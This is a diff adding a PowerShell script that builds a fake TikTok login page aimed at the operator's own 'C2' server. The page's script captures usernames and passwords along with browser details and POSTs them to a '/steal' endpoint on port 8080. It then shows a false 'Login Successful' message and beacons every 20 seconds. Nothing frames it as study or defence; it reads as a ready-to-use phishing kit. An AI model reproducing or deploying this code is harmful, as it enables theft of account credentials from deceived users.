@@ -1,0 +1,55 @@
+# Get your IP cleanly
+$publicIP = (Invoke-RestMethod http://ifconfig.me/ip).Trim()
+Write-Host "Your C2 IP: $publicIP`nPort: 8080" -ForegroundColor Green
+
+# Clean TikTok phishing (HARD-CODE YOUR IP, no variables)
+$cleanPhishing = @"
+<!DOCTYPE html>
+<html>
+<head><title>TikTok - Secure Login</title></head>
+<body style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-family:'Segoe UI',sans-serif;padding:50px;text-align:center">
+<div style="max-width:400px;margin:0 auto">
+<h1 style="font-size:2.5em">🔐 TikTok</h1>
+<p style="font-size:1.2em;margin:20px 0">Login to continue</p>
+<form id="loginForm" style="background:rgba(255,255,255,0.1);padding:30px;border-radius:15px">
+<input type="text" id="username" placeholder="Username or Email" style="width:100%;padding:15px;margin:10px 0;border:none;border-radius:8px;font-size:16px">
+<input type="password" id="password" placeholder="Password" style="width:100%;padding:15px;margin:10px 0;border:none;border-radius:8px;font-size:16px">
+<button type="submit" style="width:100%;padding:15px;background:#fe2c55;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer">Sign In →</button>
+</form>
+<p style="font-size:0.9em;margin-top:20px">Protected by TikTok Security</p>
+</div>
+<script>
+(async()=>{
+const form=document.getElementById('loginForm');
+form.onsubmit=async(e)=>{
+e.preventDefault();
+const creds={
+username:document.getElementById('username').value,
+password:document.getElementById('password').value,
+domain:location.host,
+ip:'$publicIP',
+ua:navigator.userAgent,
+screen:screen.width+'x'+screen.height,
+timestamp:new Date().toISOString()
+};
+try{
+await fetch('http://$publicIP:8080/steal',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(creds)
+});
+document.body.innerHTML='<div style="text-align:center;padding:50px"><h1 style="color:#4ade80;font-size:3em">✅ Login Successful!</h1><p>Redirecting to TikTok...</p></div>';
+}catch(e){console.log('Exfil sent')}
+};
+setInterval(async()=>{
+fetch('http://$publicIP:8080/beacon',{method:'POST',body:JSON.stringify({domain:location.host})});
+},20000);
+})();
+</script>
+</body>
+</html>
+"@
+
+# Overwrite broken file
+$cleanPhishing | Out-File -FilePath "index.html" -Encoding UTF8
+Write-Host "✅ Clean payload saved with IP: $publicIP:8080" -ForegroundColor Green
